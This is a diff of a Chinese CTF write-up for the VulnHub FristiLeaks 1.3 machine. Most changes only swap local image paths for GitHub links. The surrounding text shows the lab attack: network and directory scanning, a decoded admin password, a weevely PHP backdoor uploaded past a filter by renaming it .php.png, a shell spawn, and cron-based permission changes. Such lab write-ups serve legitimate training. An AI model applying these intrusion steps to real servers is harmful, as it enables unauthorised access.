@@ -28,7 +28,7 @@ nmap -sn 192.168.51.0/24
 arp-scan 192.168.51.0/24
 ```
 
-![1536486603832](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536486603832.png)
+![1536486603832](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536486603832.png?raw=true)
 
 确定目标是192.168.51.152
 
@@ -38,13 +38,13 @@ arp-scan 192.168.51.0/24
 nmap -sS -v -T4 -sV 192.168.51.152
 ```
 
-![1536486809534](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536486809534.png)
+![1536486809534](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536486809534.png?raw=true)
 
 # 信息收集
 
 发现它只开放了80端口，通过浏览器打开查看
 
-![1536486866946](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536486866946.png)
+![1536486866946](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536486866946.png?raw=true)
 
 查看源代码，并未发现任何有用的信息。
 
@@ -54,7 +54,7 @@ nmap -sS -v -T4 -sV 192.168.51.152
 dirhunt -t 10 --max-depth 5 http://192.168.51.152
 ```
 
-![1536487050073](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536487050073.png)
+![1536487050073](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536487050073.png?raw=true)
 
 第一次目录扫描发现它存在
 
@@ -68,15 +68,15 @@ http://192.168.51.152/images/
 
 其中`/images`目录存在目录浏览的漏洞，但是只有两个图片
 
-![1536487214603](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536487214603.png)
+![1536487214603](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536487214603.png?raw=true)
 
 查看图片，`3037440.jpg`
 
-![1536487360581](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536487360581.png)
+![1536487360581](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536487360581.png?raw=true)
 
 `keep-calm.png`
 
-![1536487385345](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536487385345.png)
+![1536487385345](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536487385345.png?raw=true)
 
 将两张图片下载到本地
 
@@ -102,7 +102,7 @@ fristi
 dirb http://192.168.51.152 zidian.txt
 ```
 
-![1536488715644](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536488715644.png)
+![1536488715644](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536488715644.png?raw=true)
 
 找到新的目录
 
@@ -110,7 +110,7 @@ dirb http://192.168.51.152 zidian.txt
 http://192.168.51.152/fristi/
 ```
 
-![1536488737422](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536488737422.png)
+![1536488737422](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536488737422.png?raw=true)
 
 发现是一个后台目录。
 
@@ -157,7 +157,7 @@ base64 -d encode.txt > encode.png
 feh encode.png
 ```
 
-![1536489293305](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536489293305.png)
+![1536489293305](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536489293305.png?raw=true)
 
 看上去是一串字符串，根据第一个提示，猜测这个是eezeepz的密码
 
@@ -167,7 +167,7 @@ eezeepz/keKkeKKeKKeKkEkkEk
 
 前往后台尝试登陆，成功登陆
 
-![1536489419727](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536489419727.png)
+![1536489419727](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536489419727.png?raw=true)
 
 是一个上传按钮，尝试上传一个php木马
 
@@ -177,7 +177,7 @@ weevely generate 123 /ziliao/ctf/fristileaks1.3/backdoor.php
 
 发现无法上传，只支持上传图片文件
 
-![1536489675464](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536489675464.png)
+![1536489675464](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536489675464.png?raw=true)
 
 将刚刚的文件，更改为png文件
 
@@ -187,7 +187,7 @@ cp backdoor.php backdoor.php.png
 
 再次上传，发现上传成功
 
-![1536489751669](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536489751669.png)
+![1536489751669](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536489751669.png?raw=true)
 
 尝试执行命令
 
@@ -195,13 +195,13 @@ cp backdoor.php backdoor.php.png
 weevely http://192.168.51.152/fristi/uploads/backdoor.php.png 123
 ```
 
-![1536489943812](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536489943812.png)
+![1536489943812](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536489943812.png?raw=true)
 
 成功获得shell，不过目前是eezeepz用户，需要进行提权
 
 尝试查看/home目录
 
-![1536490035637](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536490035637.png)
+![1536490035637](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536490035637.png?raw=true)
 
 发现存在三个用户，目前我们只可以访问eezeepz用户的目录，先查看该目录
 
@@ -221,7 +221,7 @@ python -c ‘import pty;pty.spawn(“/bin/bash”)’
 
 查看eezeepz目录下的内容
 
-![1536490880505](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536490880505.png)
+![1536490880505](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536490880505.png?raw=true)
 
 发现notes.txt文件属于自定义的文件，因此进行查看
 
@@ -237,7 +237,7 @@ echo "/home/admin/chmod -R 777 /home/admin" >/tmp/runthis
 
 查看admin
 
-![1536491100048](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536491100048.png)
+![1536491100048](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536491100048.png?raw=true)
 
 发现存在几个可疑文件
 
@@ -315,7 +315,7 @@ ls -alh
 
 发现一个目录和一个文件，分别进行查看
 
-![1536492082573](F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3\1536492082573.png)
+![1536492082573](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536492082573.png?raw=true)
 
 ```
 cd  .secret_admin_stuff
